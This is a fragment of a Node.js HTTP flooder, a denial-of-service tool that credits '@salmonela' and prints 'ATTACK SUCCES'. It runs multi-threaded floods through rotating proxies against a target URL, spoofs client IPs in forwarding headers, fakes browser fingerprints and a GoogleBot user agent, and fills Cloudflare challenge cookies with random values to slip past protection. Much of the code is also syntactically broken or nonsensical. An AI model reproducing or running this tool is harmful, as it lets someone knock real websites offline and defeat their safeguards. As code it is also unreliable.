        'session_id=' + randstr(32),
        'auth_token=' + randstr(50),
        'user_id=' + randstr(12),
        'tracking_id=' + randstr(20),
        'csrftoken=' + randstr(64),
        'pref=' + randstr(10),
        'locale=' + randstr(5),
        'cf_chl_prog=' + randstr(8),
        'cf_chl_rc_m=' + randstr(10),
        'cf_chl_seq_x_y=' + randstr(15),
        'cf_chl_2=' + randstr(18),
        '__cf_blr=' + randstr(22),
        'cfbm=' + randstr(16),
        'cfobinfo=' + randstr(32),
        'cfbmsv=' + randstr(16),
        'cfob=' + randstr(32),
        'cfobtc=' + randstr(16),
        'cfbmsz=' + randstr(16),
        'cfbmsvsz=' + randstr(16),
        'cfbmsz2=' + randstr(16),
        'cf_chl_seq=' + randstr(20),
        'cf_chl_prog_r=' + randstr(10),
        'cf_chl_rt=' + randstr(18),
        'cf_chl_rr=' + randstr(15),
        'cf_chl_tk=' + randstr(20),
        'cf_chl_uh=' + randstr(10),
        'cf_chl_captcha=' + randstr(25),
        'cf_chl_ec=' + randstr(18),
        'cf_chl_ctx=' + randstr(12),
        'cf_chl_log=' + randstr(15),
        'cf_chl_ki=' + randstr(20),
        'cf_chl_captcha_=' + randstr(25),
        'cf_chl_cd=' + randstr(18),
        'cf_chl_opt=' + randstr(16),
        'cf_chl_1=' + randstr(22),
        'cf_chl_ch_r=' + randstr(15),
        'cf_chl_av=' + randstr(10),
        'cf_chl_pass=' + randstr(20),
        'cf_chl_key=' + randstr(22),
        'cf_chl_action=' + randstr(18),
        'cf_chl_ft=' + randstr(16),
        'cf_chl_user=' + randstr(12),
        'cf_chl_token=' + randstr(30),
        'cf_chl_id=' + randstr(15),
        'cf_chl_auth=' + randstr(30),
        'cf_chl_bc=' + randstr(25),
        'cf_chl_bw=' + randstr(18),
        'cf_chl_ct=' + randstr(16),
        'cf_chl_dt=' + randstr(20),
        'cf_chl_ex=' + randstr(15),
        'cf_chl_g=' + randstr(22),
        'cf_chl_h=' + randstr(28),
        'cf_chl_j=' + randstr(30),
        'cf_chl_l=' + randstr(32),
        'cf_chl_m=' + randstr(18),
        'cf_chl_n=' + randstr(20),
        'cf_chl_p=' + randstr(22),
        'cf_chl_q=' + randstr(25),
        'cf_chl_s=' + randstr(28),
        'cf_chl_v=' + randstr(30),
        'cf_chl_x=' + randstr(32),
        'cf_chl_z=' + randstr(18),
        'cf_chl_y=' + randstr(20),
        'cf_chl_w=' + randstr(25),
    ];
    return cookies.join('; ');
}

// Function to encrypt a string
function encrypt(text) {
    const algorithm = 'aes-256-ctr';
    const secretKey = crypto.randomBytes(32);
    const iv = crypto.randomBytes(16);

    const cipher = crypto.createCipheriv(algorithm, secretKey, iv);

    const encrypted = Buffer.concat([cipher.update(text), cipher.final()]);

    return {
        iv: iv.toString('hex'),
        content: encrypted.toString('hex')
    };
}

// Main function to get encrypted cookie
function getEncryptedCookie() {
    const randomCookie = getRandomCookie();
    const encryptedCookie = encrypt(randomCookie);
    return encryptedCookie;
}

const encryptedCookie = getEncryptedCookie();

const bytes = crypto.randomBytes(16); // Tạo 16 byte ngẫu nhiên
const xAuthToken = bytes.toString('hex'); // Chuyển đổi thành chuỗi hex

  const mozilla = [
    'Mozilla/5.0 ',
    'Mozilla/6.0 ',
    'Mozilla/7.0 ',
    'Mozilla/8.0 ',
    'Mozilla/9.0 '
   ];

   function cookieString(cookie) {
    var s = "";
    for (var c in cookie) {
      s = `${s} ${cookie[c].name}=${cookie[c].value};`;
    }
    var s = s.substring(1);
    return s.substring(0, s.length - 1);
  }
     
          function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

const browserVersion = getRandomInt(120, 123);

const browsers = ['Google Chrome', 'Brave'];
const selectedBrowser = browsers[Math.floor(Math.random() * browsers.length)];

let brandValue;
if (browserVersion === 120) {
    brandValue = `"Not_A Brand";v="8", "Chromium";v="${browserVersion}", "${selectedBrowser}";v="${browserVersion}"`;
}
else if (browserVersion === 121) {
    brandValue = `"Not A(Brand";v="99", "${selectedBrowser}";v="${browserVersion}", "Chromium";v="${browserVersion}"`;
}
else if (browserVersion === 122) {
    brandValue = `"Chromium";v="${browserVersion}", "Not(A:Brand";v="24", "${selectedBrowser}";v="${browserVersion}"`;
}
else if (browserVersion === 123) {
    brandValue = `"${selectedBrowser}";v="${browserVersion}", "Not:A-Brand";v="8", "Chromium";v="${browserVersion}"`;
}

const version = `${brandValue}`;

 const site = [
  'cross-site',
  'same-origin',
  'same-site',
  'none'
];

const mode = [
  'cors',
  'navigate',
  'no-cors',
  'same-origin',
  'websocket',
  'fetch',
  'stream',
  'download',
  'upload',
  'polling'
];

const dest = [
  'audio',
  'audioworklet',
  'document',
  'embed',
  'empty',
  'font',
  'frame',
  'iframe',
  'image',
  'manifest',
  'object',
  'paintworklet',
  'report',
  'script',
  'serviceworker',
  'sharedworker',
  'style',
  'track',
  'video',
  'worker',
  'xslt',
  'form',
  'xhr',
  'eventsource',
  'navigation',
  'beacon',
  'csp-report',
  'ping',
  'ping-report'
];
  
const platform = [
  "Windows",
  "Windows Phone",
  "Macintosh",
  "Linux",
  "iOS",
  "Android",
  "PlayStation 4",
  "Xbox One",
  "Nintendo Switch",
  "Apple TV",
  "Amazon Fire TV",
  "Roku",
  "Chromecast",
  "Smart TV",
  "Other",
  "Chrome OS",
  "Ubuntu",
  "FreeBSD",
  "BlackBerry",
  "Windows Mobile",
  "Apple Watch",
  "Android TV",
  "Nintendo 3DS",
  "Windows 98",
  "Windows XP",
  "Windows Vista",
  "Windows 7",
  "Windows 8",
  "Windows 10",
  "Windows Server",
  "macOS",
  "watchOS",
  "tvOS",
  "iPadOS",
  "Kindle Fire OS",
  "Fire OS",
  "Android Wear OS",
  "Tizen",
  "WebOS",
  "Windows RT",
  "Windows RT 8.1",
  "Windows Embedded Compact",
  "Windows Phone 7",
  "Windows Phone 8",
  "Windows Phone 8.1",
  "Windows Phone 10",
  "Symbian",
  "MeeGo",
  "Bada",
  "Palm OS",
  "Solaris",
  "AIX",
  "IRIX",
  "HP-UX",
  "AmigaOS",
  "OS/2",
  "BeOS",
  "MS-DOS"
];

const randInt = (min, max) => Math.floor(Math.random() * (max - min) + min);

function randIPv4() {
    let address;
    do {
        const firstOctet = randInt(1, 224);
        if (
            firstOctet === 0 ||
            firstOctet === 10 ||
            firstOctet === 100 ||
            firstOctet === 127 ||
            firstOctet === 169 ||
            firstOctet === 172 ||
            firstOctet === 192 ||
            firstOctet === 198 ||
            firstOctet === 203
        ) {
            continue;
        }
        if (firstOctet >= 224 && firstOctet <= 239) {
            continue;
        }
        address = firstOctet + '.' + randInt(1, 256) + '.' + randInt(1, 256) + '.' + randInt(1, 256);
    } while (!address);
    return address;
 }
     

   const headerGenerator = new HeaderGenerator({
  'browsers': [{
    'name': "firefox",
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "opera",
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "edge",
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': 'chrome',
    'minVersion': 0x70,
    'httpVersion': '2'
  }, {
    'name': "safari",
    'minVersion': 0x10,
    'httpVersion': '2'
  }],
  'devices': ["desktop", "mobile"],
  'operatingSystems': ['windows', "linux", "macos", 'android', 'ios'],
  'locales': ["en-US", 'en']
});

const randomHeaders = headerGenerator.getHeaders();

const nullHexs = [
    "\x00", 
    "\xFF", 
    "\xC2", 
    "\xA0",
    "\x82",
    "\x56",
    "\x87",
    "\x88",
    "\x27",
    "\x31",
    "\x18",
    "\x42",
    "\x17",
    "\x90",
    "\x14",
    "\x82",
    "\x18",
    "\x26",
    "\x61",
    "\x04",
    "\x05",
    "\xac",
    "\x02",
    "\x50",
    "\x84",
    "\x78"
    ];

function generateRandomString(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length));
  }
  return result;
}
var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var query = queryStrings[Math.floor(Math.floor(Math.random() * queryStrings.length))];
 var pathx = pathts[Math.floor(Math.floor(Math.random() * pathts.length))];
 var mos = mozilla[Math.floor(Math.floor(Math.random() * mozilla.length))];
 var az1 = useragents[Math.floor(Math.floor(Math.random() * useragents.length))];
 var dest1 =  dest[Math.floor(Math.floor(Math.random() *  dest.length))];
 var mode1 =  mode[Math.floor(Math.floor(Math.random() *  mode.length))];
 var pf =  platform[Math.floor(Math.floor(Math.random() *  platform.length))];
 var ver =  version[Math.floor(Math.floor(Math.random() *  version.length))];
 var site1 =  site[Math.floor(Math.floor(Math.random() *  site.length))];

let currentProxy = 0;

function getProxy() {
    if(!proxies[currentProxy+1]) {
        currentProxy = 0;
    }

    currentProxy++
    return proxies[currentProxy-1]
}
 
    let mysor = '\r\n';
    let mysor1 = '\r\n';
    if (getRandomCookie() || Ref) {
        mysor = '\r\n'
        mysor1 = '';
    } else {
        mysor = '';
        mysor1 = '\r\n';
    }
    
    
function getRandomUserAgent(existingUserAgents) {
  const osList = [
    'Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 6.2', 'Windows NT 6.0', 'Windows NT 5.1',
    'Windows NT 5.2', 'Windows NT 5.0', 'Windows 2000', 'Windows ME', 'Windows 98', 'Windows 95', 'Windows CE',
    'Macintosh; Intel Mac OS X 10_15_7', 'Macintosh; Intel Mac OS X 10_14_6', 'Macintosh; Intel Mac OS X 11_1',
    'Macintosh; Intel Mac OS X 10.13', 'Macintosh; Intel Mac OS X 10.12', 'Macintosh; Intel Mac OS X 10.11',
    'Macintosh; Intel Mac OS X 10.10', 'Macintosh; Intel Mac OS X 10.9', 'Macintosh; Intel Mac OS X 10.8',
    'Macintosh; Intel Mac OS X 10.7', 'Macintosh; Intel Mac OS X 10.6', 'Macintosh; Intel Mac OS X 10.5',
    'iPhone; CPU iPhone OS 14_2 like Mac OS X', 'iPad; CPU OS 13_3 like Mac OS X', 'Android 12; Mobile',
    'Android 11; Mobile', 'Android 10; Mobile', 'Linux; Android 9; Mobile', 'Linux; Android 8.1; Mobile',
    'Linux; U; Android 4.4.2; Mobile', 'Linux; U; Android 4.3; Mobile', 'Linux; U; Android 4.2; Mobile',
    'Linux; U; Android 4.1.2; Mobile', 'Linux; U; Android 4.0.4; Mobile', 'Linux; U; Android 2.3; Mobile',
    'Ubuntu; Linux x86_64', 'Fedora; Linux x86_64', 'Debian; Linux x86_64', 'Linux x86_64', 'FreeBSD',
    'OpenBSD', 'NetBSD', 'Solaris', 'BlackBerry', 'Nintendo Switch', 'Unix', 'Chrome OS', 'CentOS', 'Red Hat Enterprise Linux',
    'Arch Linux', 'Mandriva', 'Mageia', 'Slackware', 'Gentoo'
  ];
  
  const browserList = [
    'Chrome', 'Firefox', 'Safari', 'Edge', 'Opera', 'Chromium', 'Vivaldi', 'Brave', 'Internet Explorer',
    'DuckDuckGo', 'Tor Browser', 'Samsung Browser', 'UC Browser', 'QQ Browser', 'Baidu Browser',
    'Yandex Browser', 'Maxthon', 'Waterfox', 'Pale Moon', 'SeaMonkey', 'Konqueror', 'Avant Browser',
    'SlimBrowser', 'Epic Privacy Browser', 'Ghost Browser', 'Sleipnir', 'Torch Browser', 'Falkon',
    'Gnome Web', 'IceCat', 'QuteBrowser', 'Beaker Browser', 'Min Browser', 'Otter Browser', 'Midori',
    'NetSurf', 'Elinks', 'Links', 'Lynx', 'Amaya', 'K-Meleon', 'Epiphany', 'Stainless', 'Wyzo',
    'Orca', 'Sputnik', 'CometBird', 'QtWeb', 'OmniWeb', 'Shiira', 'Beonex', 'Viera', 'Blackbird', 'Conkeror'
  ];
  
  const browserVersionList = [
    getRandomInt(120, 123), getRandomInt(85, 89), getRandomInt(14, 15), getRandomInt(91, 92), getRandomInt(77, 78),
    getRandomInt(70, 79), getRandomInt(55, 65), getRandomInt(10, 11), getRandomInt(7, 9), getRandomInt(5, 6),
    getRandomInt(60, 69), getRandomInt(25, 35), getRandomInt(30, 40), getRandomInt(50, 60), getRandomInt(1, 10),
    getRandomInt(16, 20), getRandomInt(42, 45), getRandomInt(80, 85), getRandomInt(65, 70), getRandomInt(22, 28)
  ];
  
  const languageList = [
    'en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES', 'it-IT', 'nl-NL', 'pt-BR', 'ru-RU', 'zh-CN',
    'ja-JP', 'ko-KR', 'ar-SA', 'he-IL', 'sv-SE', 'da-DK', 'fi-FI', 'no-NO', 'pl-PL', 'tr-TR',
    'hu-HU', 'cs-CZ', 'el-GR', 'ro-RO', 'vi-VN', 'th-TH', 'id-ID', 'ms-MY', 'hi-IN', 'ta-IN',
    'bn-BD', 'te-IN', 'mr-IN', 'ml-IN', 'pa-IN', 'gu-IN', 'af-ZA', 'sq-AL', 'am-ET', 'eu-ES',
    'be-BY', 'bs-BA', 'bg-BG', 'ca-ES', 'hr-HR', 'zh-TW', 'co-FR', 'eo', 'et-EE', 'fo-FO',
    'ga-IE', 'gl-ES', 'haw-US', 'is-IS', 'jv-ID', 'kn-IN', 'kk-KZ', 'ku-TR', 'lo-LA', 'la-VA',
    'lv-LV', 'lt-LT', 'mg-MG', 'mt-MT', 'mi-NZ', 'mn-MN', 'ne-NP', 'ps-AF', 'rm-CH', 'sm-WS'
  ];
  
  const countryList = [
    'US', 'GB', 'FR', 'DE', 'ES', 'IT', 'NL', 'BR', 'RU', 'CN',
    'JP', 'KR', 'SA', 'IL', 'SE', 'DK', 'FI', 'NO', 'PL', 'TR',
    'HU', 'CZ', 'GR', 'RO', 'VN', 'TH', 'ID', 'MY', 'IN', 'SG', 'TW',
    'BD', 'PK', 'LK', 'NP', 'AE', 'ZA', 'NG', 'KE', 'EG', 'MA',
    'ZA', 'AL', 'ET', 'BY', 'BA', 'BG', 'ES', 'HR', 'TW', 'FR',
    'EO', 'EE', 'FO', 'GG', 'GL', 'HT', 'HU', 'IS', 'IO', 'IE'
  ];
  
  const manufacturerList = [
    'AppleWebKit', 'Gecko', 'Trident', 'Blink', 'WebKit', 'Presto', 'KHTML', 'EdgeHTML', 'Goanna', 'Servo',
    'NetFront', 'Netsurf', 'UP.Browser', 'Midori', 'Elinks', 'Dillo', 'Links', 'Lynx', 'Amaya', 'Curl',
    'Surf', 'Bolt', 'Dolphin', 'NetFront', 'Obigo', 'Oregano', 'Avant', 'DWB', 'Flock', 'iCab',
    'Pale Moon', 'Seamonkey', 'K-Meleon', 'Epiphany', 'Stainless', 'Wyzo', 'Orca', 'Sleipnir', 'Rockmelt',
    'CometBird', 'QtWeb', 'OmniWeb', 'Shiira', 'Beonex', 'Viera', 'Blackbird', 'Conkeror', 'Sputnik',
    'GNU IceCat', 'QuteBrowser', 'DWB', 'Falkon', 'Gnome Web', 'Min', 'Otter Browser', 'Waterfox', 'Basilisk',
    'Fennec', 'Phoenix', 'Swiftfox', 'TenFourFox', 'Vivaldi', 'Arora', 'Basilisk', 'Camino', 'Dooble'
  ];
  
  let userAgentString = '';

  do {
    const os = osList[Math.floor(Math.random() * osList.length)];
    const browser = browserList[Math.floor(Math.random() * browserList.length)];
    const browserVersion = browserVersionList[Math.floor(Math.random() * browserVersionList.length)];
    const language = languageList[Math.floor(Math.random() * languageList.length)];
    const country = countryList[Math.floor(Math.random() * countryList.length)];
    const manufacturer = manufacturerList[Math.floor(Math.random() * manufacturerList.length)];

    userAgentString = `${manufacturer}/${browser}/${browserVersion}.0 (${os}; ${country}; ${language})`;
  } while (existingUserAgents.has(userAgentString));

  existingUserAgents.add(userAgentString);

  const encryptedString = btoa(userAgentString);
  let finalString = '';
  for (let i = 0; i < encryptedString.length; i++) {
    if (i % 2 === 0) { // Every 2nd character for a bit more randomness
      finalString += encryptedString.charAt(i);
    } else {
      finalString += encryptedString.charAt(i).toUpperCase();
    }
  }
  return finalString;
}

function generateUniqueUserAgents(count) {
  const userAgents = new Set();
  const encryptedUserAgents = [];

  while (userAgents.size < count) {
    const newUserAgent = getRandomUserAgent(userAgents);
    encryptedUserAgents.push(newUserAgent);
  }

  return encryptedUserAgents;
}

const uap = generateUniqueUserAgents(100); // Generate 100 unique user agents
            var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];

    
 var proxies = readLines(args.proxyFile);
 const parsedTarget = new URL(args.target);
 const target_url = parsedTarget.host;
 parsedTarget.path = parsedTarget.pathname + parsedTarget.search;
  const generateJA3 = (cipherSuites, extensions) => {
    const ja3String = cipherSuites.join(',') + ',' + extensions.join(',');
    return crypto.createHash('md5').update(ja3String).digest('hex');
};   

      if (cluster.isMaster) {
        for (let counter = 1; counter <= args.threads; counter++) {
          cluster.fork();
          core: args.threads % os.cpus().length
          console.log(`[!] ATTACK SUCCES !`);
          console.log(`[!] FLOODER BY @salmonela.`);
          console.log(gradient.vice(`------------------------------------------`))
          console.log(gradient.vice(`Target: `+ process.argv[2]))
          console.log(gradient.vice(`Time: `+ process.argv[3]))
          console.log(gradient.vice(`Rate: `+ process.argv[4]))
          console.log(gradient.vice(`Thread: ` + process.argv[5]))
          console.log(gradient.vice(`Proxy: ` + process.argv[6]))
          console.log(gradient.vice(`------------------------------------------`))       
        }
      } else {
        setInterval(runFlooder);
      };

 function generateRandomString(minLength, maxLength) {
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'; 
        const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
        let result = '';
        
        for (let i = 0; i < length; i++) {
            const randomIndex = Math.floor(Math.random() * characters.length);
            result += characters.charAt(randomIndex);
        }
    
        return result;
    }

 class NetSocket {
     constructor(){}

  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     //connection.setTimeout(options.timeout * 600000);
     connection.setTimeout(options.timeout * 100000);
     connection.setKeepAlive(true, 100000);
     connection.setNoDelay(true);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 const p = parsedTarget.path.replace(/%RAND%/g, () => Array.from({ length: 16 }, () => Math.floor(Math.random() * 36).toString(36)).join(''));
 function buildPathWithQuery(parsedTarget, useQuery) {
    if (useQuery) {
        return parsedTarget.path + pathx + "&", + '?' + generateRandomString(5, 15) + '=' + query +  + generateRandomString(20, 25) + ":443";
    } else {
        return path(parsedTarget.path, '[rand]', 8);
    };
 };

 const useQuery = process.argv[8] === 'true';
 
 const Headers = new NetSocket();
 headers[":method"] = "GET", kontol,
  headers[":authority"] = parsedTarget.host + ":443";
  headers["origin"] = "https://" + parsedTarget.host + ":443"; // Include port 80 in origin header
  headers["Via"] = "1.2" + parsedTarget.host + spoofed + ":443";
 headers[":path"] = buildPathWithQuery(parsedTarget, useQuery); // Include port 80 in Via header
 headers[":scheme"] = "https";
 headers["x-forwarded-proto"] = "https";
 headers["accept-language"] = lang;
 headers["accept-encoding"] = encoding;
 headers["accept"] = accept;
 headers["accept-patch"] =  randomHeaders["accept-patch"];
 headers["date"] =  randomHeaders["date"];
 headers["accept-charset"] = randomHeaders['accept-charset'];
 headers["referer"] = Ref + mysor1;
 headers["content-type"] = randomHeaders["content-type"];
 headers["media-type"] = randomHeaders["media-type"];
 headers["cf-cache-status"] = "BYPASS", "HIT", "DYNAMIC";
 headers["expires"] = randomHeaders["expires"];
 headers["X-Permitted-Cross-Domain-Policies"] = randomHeaders["X-Permitted-Cross-Domain-Policies"];
 headers["Cache-Status"] = randomHeaders["Cache-Status"];
 headers["accept-ranges"] = randomHeaders["accept-ranges"];
 headers["accept-media"] = randomHeaders["accept-media"];
 headers["cache-control"] = control;
 headers["pragma"] = control;
 headers["Proxy-Authenticate"] = randomHeaders["Proxy-Authenticate"];
 headers["vary"] = randomHeaders["vary"]; // M
 headers["x-server"] = randomHeaders["x-server"]; 
 headers["x-cache-status"] = "BYPASS", "HIT", "DYNAMIC";
 headers["x-download-options"] = randomHeaders['x-download-options'];
 headers["Cross-Origin-Embedder-Policy"] = randomHeaders['Cross-Origin-Embedder-Policy'];
 headers["Cross-Origin-Opener-Policy"] = randomHeaders['Cross-Origin-Opener-Policy'];
 headers["Referrer-Policy"] = randomHeaders['Referrer-Policy'];
 headers["x-cache"] = randomHeaders['x-cache'];
 headers["Content-Security-Policy"] = randomHeaders['Content-Security-Policy'];
 headers["Allow"] = randomHeaders["Allow"];
 headers["Connection"] = randomHeaders["Connection"];
 headers["Keep-Alive"] = randomHeaders["Keep-Alive"];
 headers["strict-transport-security"] = randomHeaders['strict-transport-security'];
 headers["Access-Control-Allow-Headers"] = randomHeaders['Access-Control-Allow-Headers'];
 headers["x-xss-protection"] = randomHeaders['x-xss-protection'];
 headers["x-content-type-options"] = randomHeaders["x-content-type-options"];
 headers["Access-Control-Allow-Origin"] = randomHeaders['Access-Control-Allow-Origin'];
 headers["Content-Encoding"] = randomHeaders['Content-Encoding'];
 headers["X-XSS-Protection"] = randomHeaders["X-XSS-Protection"];
 headers["Clear-Site-Data"] = "cache", "cookies";
 headers["x-request-id"] = randomHeaders["x-request-id"]; 
 headers["x-dns-prefetch-control"] = randomHeaders["x-dns-prefetch-control"]; 
 headers["upgrade-insecure-requests"] = randomElement(["0", "1"]);
 headers["Feature-Policy"] =  randomHeaders["Feature-Policy"];
 headers["x-request-data"] = "BYPASS", "HIT", "DYNAMIC"; // Menentukan waktu kedaluwarsa respons
headers["Cross-Origin-Resource-Policy"] = randomHeaders["Cross-Origin-Resource-Policy"]; // Menentukan kebijakan sumber daya lintas asal untuk melindungi privasi pengguna
headers["X-Forwarded-For"] = spoofed;
headers["X-Forwarded-Host"] = spoofed;
headers["X-Originating-IP"] = spoofed;
headers["X-Forwarded-Server"] = spoofed;
headers["CF-Connecting-IP"] = spoofed;
headers["True-Client-IP"] = spoofed;
headers["Forwarded"] = spoofed;
headers["Client-IP"] = spoofed;
headers["sec-ch-ua"] = ver;
headers["sec-ch-ua-mobile"] = randomElement(["?0", "?1"]);
headers["sec-ch-ua-platform"] = pf + mysor;
headers["sec-ch-ua-platform-version"] = randomHeaders["sec-ch-ua-platform-version"];
headers["sec-fetch-dest"] = dest1;
headers["sec-fetch-mode"] = mode1;
headers["sec-fetch-site"] = site1;
headers["sec-ch-ua-model"] = randomHeaders["sec-ch-ua-model"];
headers["sec-ch-ua-arch"] = randomHeaders["sec-ch-ua-arch"];
headers["sec-ch-ua-full-version"] = randomHeaders["sec-ch-ua-full-version"];
headers["sec-ch-ua-bitness"] = randomHeaders["sec-ch-ua-bitness"];
headers["sec-ch-ua-platform-type"] = randomHeaders["sec-ch-ua-platform-type"];
headers["sec-fetch-user"] = randomElement(["?0", "?1"]);
headers["sec-origin-policy"] = randomHeaders["sec-origin-policy"];
headers["sec-content-security-policy"] = randomHeaders["sec-content-security-policy"];
headers["DNT"] = randomHeaders["DNT"];
headers["RTT"] = randomHeaders["RTT"];
headers["Ect"] = randomHeaders["Ect"];
headers["DPR"] = randomHeaders["DPR"];
headers["Service-Worker-Navigation-Preload"] = "true";       
headers["TE"] = "trailers";
headers["Trailer"] = "Max-Forwards";
headers["set-cookie"] = randomHeaders["set-cookie"];
headers["cookie"] = randomHeaders["cookie"] + "; " + encryptedCookie;
headers["Alt-Svc"] = randomHeaders["Alt-Svc"];
headers["Sec-Websocket-Key"] = spoofed2;
headers["Sec-Websocket-Version"] = 13;
headers["Upgrade"] = randomHeaders["Upgrade"];
headers["Server"] = randomHeaders["Server"];
headers["range"] = randomHeaders["range"];
headers["downlink"] = randomHeaders["downlink"];
headers["EagleId"] = randomHeaders["EagleId"];
headers["viewport-width"] = randomHeaders["viewport-width"];
headers["width"] = randomHeaders["width"];
headers["Accept-CH"] = randomHeaders["Accept-CH"];
headers["memory-device"] = randomHeaders["memory-device"];
headers["content-lenght"] = randomHeaders["content-lenght"];
headers["cdn-loop"] = parsedTarget.host;
headers["CF-Ray"] = randomHeaders["CF-Ray"];  // Example header added by Cloudflare
headers["CF-Connecting-IP"] = spoofed;       // The original visitor IP address
headers["CF-IPCountry"] = randomHeaders["CF-IPCountry"];  // Country of the original request
headers["CF-Visitor"] = '{"scheme":"https"}';  // Indicates the scheme (http or https) of the original request
headers["CF-Worker"] = randomHeaders["CF-Worker"];  // Information about the Cloudflare worker handling the request
headers["CF-RAY"] = randomHeaders["CF-RAY"];  // Another example of CF-Ray header
headers["Except"] = randomHeaders["Except"];
headers["Forwarder"] = randomHeaders["Forwarder"];
headers["From"] = randomHeaders["From"];
headers["X-Ttl"] = randomHeaders["X-Ttl"];
headers["From"] = randomHeaders["From"];
headers["content-language"] = randomHeaders["content-language"];
headers["content-location"] = randomHeaders["content-location"];
headers["content-range"] = randomHeaders["content-range"];
headers["if-modified-since"] = randomHeaders["if-modified-since"];
headers["if-none-match"] = randomHeaders["if-none-match"];
headers["if-range"] = randomHeaders["if-range"];
headers["if-unmodified-since"] = randomHeaders["if-unmodified-since"];
headers["X-Auth-Token"] = xAuthToken;
headers["range"] = randomHeaders["range"];
headers["X-Swift-SaveTime"] = randomHeaders["X-Swift-SaveTime"];
headers["referrer-policy"] = randomHeaders["referrer-policy"];
headers["retry-after"] = randomHeaders["retry-after"];
headers["Age"] = randomHeaders["Age"];
headers["Host"] = randomHeaders["Host"];
headers["x-hcdn-cache-status"] = randomHeaders["x-hcdn-cache-status"];
headers["X-Cacheable"] = randomHeaders["X-Cacheable"];
headers["X-Cache-Group"] = randomHeaders["X-Cache-Group"];
headers["Origin-Agent-Cluster"] = randomHeaders["Origin-Agent-Cluster"];
headers["x-amz-version-id"] = randomHeaders["x-amz-version-id"];
headers["Permissions-Policy"] = randomHeaders["Permissions-Policy"];
headers["cf-chl-out"] = randomHeaders["cf-chl-out"];
headers["Last-Modified"] = randomHeaders["Last-Modified"];
headers["cf-mitigated"] = randomHeaders["cf-mitigated"];
headers["Critical-CH"] = randomHeaders["Critical-CH"];
headers["CF-Challenge"] = randomHeaders["CF-Challenge"];
headers["Transfer-Encoding"] = randomHeaders["Transfer-Encoding"];
headers["X-Amz-Cf-Id"] = randomHeaders["X-Amz-Cf-Id"];
headers["X-Amz-Cf-Pop"] = randomHeaders["X-Amz-Cf-Pop"];
headers["X-Served-By"] = randomHeaders["X-Served-By"];
headers["X-Cache-TTL"] = randomHeaders["X-Cache-TTL"];
headers["x-proxy-cache"] = randomHeaders["x-proxy-cache"];
headers["X-Cache-Hits"] = randomHeaders["X-Cache-Hits"];
headers["X-Swift-CacheTime"] = randomHeaders["X-Swift-CacheTime"];
headers["X-Backend"] = randomHeaders["X-Backend"];
headers["X-UA-Compatible"] = randomHeaders["X-UA-Compatible"];
headers["X-ac"] = randomHeaders["X-ac"];
headers["Authorization"] = randomHeaders["Authorization"];
headers["x-hcdn-upstream-rt"] = randomHeaders["x-hcdn-upstream-rt"];
headers["expect-ct"] = randomHeaders["expect-ct"];
headers["x-hcdn-request-id"] = randomHeaders["x-hcdn-request-id"];
headers["X-DNS-Prefetch-Control"] = randomHeaders["X-DNS-Prefetch-Control"];
headers["X-Country-ID"] = randomHeaders["X-Country-ID"]; 
headers["JA3"] = generateJA3(tlsConn.getCipher(), tlsConn.getPeerCertificate().subject.CN)
headers["user-agent"] = uap1 + mos + az1 + "-(GoogleBot + http://www.google.com)" + " Code:" + randstr(7);        
headers.push({ "Alt-Svc": "http/1.1=" + parsedTarget.host + "; ma=7200" }); // Add the http/1.1 header
headers.push({ "Alt-Svc": "http/1.2=" + parsedTarget.host + "; ma=7200" }); // Add the http/1.2 header
headers.push({ "Alt-Svc": "http/2=" + parsedTarget.host + "; ma=7200" });   // Add the http/2 header 
headers.push({ "Alt-Svc": "http/1.1=http2." + parsedTarget.host + ":80; ma=7200" }); // Add the http/1.1 header with port 80
headers.push({ "Alt-Svc": "http/1.2=http2." + parsedTarget.host + ":80; ma=7200" }); // Add the http/1.2 header with port 80
headers.push({ "Alt-Svc": "http/2=http2." + parsedTarget.host + ":80; ma=7200" });   // Add the http/2 header with port 80
headers.push({ "Alt-Svc": "http/1.1=" + parsedTarget.host + ":443; ma=7200" });      // Add the http/1.1 header with port 443
headers.push({ "Alt-Svc": "http/1.2=" + parsedTarget.host + ":443; ma=7200" });      // Add the http/1.2 header with port 443
headers.push({ "Alt-Svc": "http/2=" + parsedTarget.host + ":443; ma=7200" });        // Add the http/2 header with port 443  


  function runFlooder() {
     const proxyAddr = getProxy();
     const headers = {};
     const parsedProxy = proxyAddr.split(":"); 
     const userAgentv2 = new UserAgent();
     
      const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
          timeout: 100,
     };

